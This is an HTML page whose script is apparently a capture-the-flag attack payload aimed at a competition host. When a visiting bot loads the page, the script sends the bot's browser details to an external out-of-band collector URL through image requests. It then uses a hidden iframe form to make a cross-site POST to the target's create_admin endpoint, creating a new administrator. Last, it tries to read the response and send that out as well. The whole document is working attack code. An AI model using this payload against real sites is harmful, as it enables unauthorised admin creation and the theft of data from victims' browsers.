<!DOCTYPE html>
<html>
<body>
<iframe id="sink" name="sink" style="display:none"></iframe>

<script>
(async () => {
  const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";

  function exfil(tag, data) {
    const enc = btoa(unescape(encodeURIComponent(data)));
    new Image().src = `${OAST}/${tag}?d=${encodeURIComponent(enc)}`;
  }

  /* 1️⃣ инфа о боте */
  exfil("bot",
    JSON.stringify({
      ua: navigator.userAgent,
      lang: navigator.language,
      time: new Date().toISOString(),
      url: location.href
    })
  );

  /* 2️⃣ POST create_admin через iframe */
  const form = document.createElement("form");
  form.method = "POST";
  form.action = "https://tasks.goidactf.ru:20246/create_admin";
  form.target = "sink";

  const input = document.createElement("input");
  input.type = "hidden";
  input.name = "new_admin_login";
  input.value = "ctfadmin_" + Date.now();

  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();

  exfil("state", "form_submitted");

  /* 3️⃣ пробуем прочитать ответ */
  setTimeout(() => {
    try {
      const frame = document.getElementById("sink");
      const doc = frame.contentDocument || frame.contentWindow.document;
      const body = doc?.body?.innerText || "EMPTY_BODY";
      exfil("response", body);
    } catch (e) {
      exfil("error", e.toString());
    }
  }, 2000);

})();
</script>
</body>
</html>
